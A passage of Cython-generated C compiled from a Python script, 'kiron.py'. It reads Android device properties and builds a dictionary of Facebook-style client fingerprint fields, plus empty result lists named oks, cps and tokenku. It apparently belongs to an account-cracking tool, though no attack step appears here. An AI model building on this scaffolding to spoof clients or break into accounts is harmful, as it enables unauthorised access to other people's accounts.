          __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
          goto __pyx_L61_try_end;
          __pyx_L56_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

          /* "kiron.py":101
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 *                         sim_id+=fbcr
 *                 except Exception as e:             # <<<<<<<<<<<<<<
 *                         fbcr = "Zong"
 *                         sim_id+=fbcr
 */
          __pyx_t_15 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
          if (__pyx_t_15) {
            __Pyx_AddTraceback("kiron", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_3, &__pyx_t_8) < 0) __PYX_ERR(0, 101, __pyx_L58_except_error)
            __Pyx_XGOTREF(__pyx_t_7);
            __Pyx_XGOTREF(__pyx_t_3);
            __Pyx_XGOTREF(__pyx_t_8);
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_3) < 0) __PYX_ERR(0, 101, __pyx_L58_except_error)
            /*try:*/ {

              /* "kiron.py":102
 *                         sim_id+=fbcr
 *                 except Exception as e:
 *                         fbcr = "Zong"             # <<<<<<<<<<<<<<
 *                         sim_id+=fbcr
 *         else:
 */
              if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_n_s_Zong) < 0) __PYX_ERR(0, 102, __pyx_L67_error)

              /* "kiron.py":103
 *                 except Exception as e:
 *                         fbcr = "Zong"
 *                         sim_id+=fbcr             # <<<<<<<<<<<<<<
 *         else:
 *                 fbcr = 'Zong'
 */
              __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 103, __pyx_L67_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_fbcr); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 103, __pyx_L67_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_24 = PyNumber_InPlaceAdd(__pyx_t_2, __pyx_t_10); if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 103, __pyx_L67_error)
              __Pyx_GOTREF(__pyx_t_24);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (PyDict_SetItem(__pyx_d, __pyx_n_s_sim_id, __pyx_t_24) < 0) __PYX_ERR(0, 103, __pyx_L67_error)
              __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
            }

            /* "kiron.py":101
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 *                         sim_id+=fbcr
 *                 except Exception as e:             # <<<<<<<<<<<<<<
 *                         fbcr = "Zong"
 *                         sim_id+=fbcr
 */
            /*finally:*/ {
              /*normal exit:*/{
                if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 101, __pyx_L58_except_error) }
                goto __pyx_L68;
              }
              __pyx_L67_error:;
              /*exception exit:*/{
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __pyx_t_19 = 0; __pyx_t_18 = 0; __pyx_t_17 = 0; __pyx_t_26 = 0; __pyx_t_27 = 0; __pyx_t_28 = 0;
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
                if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_26, &__pyx_t_27, &__pyx_t_28);
                if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_19, &__pyx_t_18, &__pyx_t_17) < 0)) __Pyx_ErrFetch(&__pyx_t_19, &__pyx_t_18, &__pyx_t_17);
                __Pyx_XGOTREF(__pyx_t_19);
                __Pyx_XGOTREF(__pyx_t_18);
                __Pyx_XGOTREF(__pyx_t_17);
                __Pyx_XGOTREF(__pyx_t_26);
                __Pyx_XGOTREF(__pyx_t_27);
                __Pyx_XGOTREF(__pyx_t_28);
                __pyx_t_15 = __pyx_lineno; __pyx_t_9 = __pyx_clineno; __pyx_t_25 = __pyx_filename;
                {
                  if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 101, __pyx_L72_error) }
                }
                if (PY_MAJOR_VERSION >= 3) {
                  __Pyx_XGIVEREF(__pyx_t_26);
                  __Pyx_XGIVEREF(__pyx_t_27);
                  __Pyx_XGIVEREF(__pyx_t_28);
                  __Pyx_ExceptionReset(__pyx_t_26, __pyx_t_27, __pyx_t_28);
                }
                __Pyx_XGIVEREF(__pyx_t_19);
                __Pyx_XGIVEREF(__pyx_t_18);
                __Pyx_XGIVEREF(__pyx_t_17);
                __Pyx_ErrRestore(__pyx_t_19, __pyx_t_18, __pyx_t_17);
                __pyx_t_19 = 0; __pyx_t_18 = 0; __pyx_t_17 = 0; __pyx_t_26 = 0; __pyx_t_27 = 0; __pyx_t_28 = 0;
                __pyx_lineno = __pyx_t_15; __pyx_clineno = __pyx_t_9; __pyx_filename = __pyx_t_25;
                goto __pyx_L58_except_error;
                __pyx_L72_error:;
                if (PY_MAJOR_VERSION >= 3) {
                  __Pyx_XGIVEREF(__pyx_t_26);
                  __Pyx_XGIVEREF(__pyx_t_27);
                  __Pyx_XGIVEREF(__pyx_t_28);
                  __Pyx_ExceptionReset(__pyx_t_26, __pyx_t_27, __pyx_t_28);
                }
                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                __pyx_t_26 = 0; __pyx_t_27 = 0; __pyx_t_28 = 0;
                goto __pyx_L58_except_error;
              }
              __pyx_L68:;
            }
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            goto __pyx_L57_exception_handled;
          }
          goto __pyx_L58_except_error;

          /* "kiron.py":98
 *                 sim_id+=fbcr
 *         elif select == '2':
 *                 try:             # <<<<<<<<<<<<<<
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 *                         sim_id+=fbcr
 */
          __pyx_L58_except_error:;
          __Pyx_XGIVEREF(__pyx_t_22);
          __Pyx_XGIVEREF(__pyx_t_21);
          __Pyx_XGIVEREF(__pyx_t_20);
          __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_21, __pyx_t_20);
          goto __pyx_L46_error;
          __pyx_L57_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_22);
          __Pyx_XGIVEREF(__pyx_t_21);
          __Pyx_XGIVEREF(__pyx_t_20);
          __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_21, __pyx_t_20);
          __pyx_L61_try_end:;
        }

        /* "kiron.py":97
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 *                 sim_id+=fbcr
 *         elif select == '2':             # <<<<<<<<<<<<<<
 *                 try:
 *                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 */
        goto __pyx_L55;
      }

      /* "kiron.py":105
 *                         sim_id+=fbcr
 *         else:
 *                 fbcr = 'Zong'             # <<<<<<<<<<<<<<
 *                 sim_id+=fbcr
 * except:
 */
      /*else*/ {
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_n_s_Zong) < 0) __PYX_ERR(0, 105, __pyx_L46_error)

        /* "kiron.py":106
 *         else:
 *                 fbcr = 'Zong'
 *                 sim_id+=fbcr             # <<<<<<<<<<<<<<
 * except:
 *         fbcr = "Zong"
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 106, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbcr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 106, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_7 = PyNumber_InPlaceAdd(__pyx_t_8, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L46_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_sim_id, __pyx_t_7) < 0) __PYX_ERR(0, 106, __pyx_L46_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }
      __pyx_L55:;

      /* "kiron.py":88
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 * try:             # <<<<<<<<<<<<<<
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 *         total = 0
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L51_try_end;
    __pyx_L46_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "kiron.py":107
 *                 fbcr = 'Zong'
 *                 sim_id+=fbcr
 * except:             # <<<<<<<<<<<<<<
 *         fbcr = "Zong"
 * device = {
 */
    /*except:*/ {
      __Pyx_AddTraceback("kiron", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_3, &__pyx_t_8) < 0) __PYX_ERR(0, 107, __pyx_L48_except_error)
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_8);

      /* "kiron.py":108
 *                 sim_id+=fbcr
 * except:
 *         fbcr = "Zong"             # <<<<<<<<<<<<<<
 * device = {
 *         'android_version':android_version,
 */
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_n_s_Zong) < 0) __PYX_ERR(0, 108, __pyx_L48_except_error)
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L47_exception_handled;
    }

    /* "kiron.py":88
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 * try:             # <<<<<<<<<<<<<<
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 *         total = 0
 */
    __pyx_L48_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_5, __pyx_t_6);
    goto __pyx_L1_error;
    __pyx_L47_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_5, __pyx_t_6);
    __pyx_L51_try_end:;
  }

  /* "kiron.py":110
 *         fbcr = "Zong"
 * device = {
 *         'android_version':android_version,             # <<<<<<<<<<<<<<
 *         'model':model,
 *         'build':build,
 */
  __pyx_t_8 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_android_version); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_android_version, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":111
 * device = {
 *         'android_version':android_version,
 *         'model':model,             # <<<<<<<<<<<<<<
 *         'build':build,
 *         'fblc':fblc,
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_model); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 111, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_model, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":112
 *         'android_version':android_version,
 *         'model':model,
 *         'build':build,             # <<<<<<<<<<<<<<
 *         'fblc':fblc,
 *         'fbmf':fbmf,
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_build); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 112, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_build, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":113
 *         'model':model,
 *         'build':build,
 *         'fblc':fblc,             # <<<<<<<<<<<<<<
 *         'fbmf':fbmf,
 *         'fbbd':fbbd,
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fblc); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 113, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fblc, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":114
 *         'build':build,
 *         'fblc':fblc,
 *         'fbmf':fbmf,             # <<<<<<<<<<<<<<
 *         'fbbd':fbbd,
 *         'fbdv':model,
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbmf); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 114, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fbmf, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":115
 *         'fblc':fblc,
 *         'fbmf':fbmf,
 *         'fbbd':fbbd,             # <<<<<<<<<<<<<<
 *         'fbdv':model,
 *         'fbsv':fbsv,
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbbd); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 115, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fbbd, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":116
 *         'fbmf':fbmf,
 *         'fbbd':fbbd,
 *         'fbdv':model,             # <<<<<<<<<<<<<<
 *         'fbsv':fbsv,
 *         'fbca':fbca,
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_model); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 116, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fbdv, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":117
 *         'fbbd':fbbd,
 *         'fbdv':model,
 *         'fbsv':fbsv,             # <<<<<<<<<<<<<<
 *         'fbca':fbca,
 *         'fbdm':fbdm}
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbsv); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 117, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fbsv, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":118
 *         'fbdv':model,
 *         'fbsv':fbsv,
 *         'fbca':fbca,             # <<<<<<<<<<<<<<
 *         'fbdm':fbdm}
 * #__________________[ FOLDER ]__________________#
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbca); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 118, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fbca, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":119
 *         'fbsv':fbsv,
 *         'fbca':fbca,
 *         'fbdm':fbdm}             # <<<<<<<<<<<<<<
 * #__________________[ FOLDER ]__________________#
 * try:os.mkdir('/sdcard/AYYUB')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_fbdm); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 119, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_fbdm, __pyx_t_3) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_device, __pyx_t_8) < 0) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":121
 *         'fbdm':fbdm}
 * #__________________[ FOLDER ]__________________#
 * try:os.mkdir('/sdcard/AYYUB')             # <<<<<<<<<<<<<<
 * except:pass
 * #__________________| LOOP |__________________#
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 121, __pyx_L75_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 121, __pyx_L75_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__129, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 121, __pyx_L75_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L80_try_end;
    __pyx_L75_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "kiron.py":122
 * #__________________[ FOLDER ]__________________#
 * try:os.mkdir('/sdcard/AYYUB')
 * except:pass             # <<<<<<<<<<<<<<
 * #__________________| LOOP |__________________#
 * loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = [];user = []
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L76_exception_handled;
    }
    __pyx_L76_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_1);
    __pyx_L80_try_end:;
  }

  /* "kiron.py":124
 * except:pass
 * #__________________| LOOP |__________________#
 * loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = [];user = []             # <<<<<<<<<<<<<<
 * #__________________[ SYS ]__________________#
 * sys.stdout.write('\x1b]2; ~AYYUB~\x07')
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_int_0) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_oks, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cps, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_twf, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pcp, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_id, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tokenku, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uid, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_plist, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyList_New(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_user, __pyx_t_8) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "kiron.py":126
 * loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = [];user = []
 * #__________________[ SYS ]__________________#
 * sys.stdout.write('\x1b]2; ~AYYUB~\x07')             # <<<<<<<<<<<<<<
 * #__________________| COLOUR |__________________#
 * A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 */
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_sys); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_stdout); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__130, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":128
 * sys.stdout.write('\x1b]2; ~AYYUB~\x07')
 * #__________________| COLOUR |__________________#
 * A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'             # <<<<<<<<<<<<<<
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_s_1_97m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_s_38_5_196m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
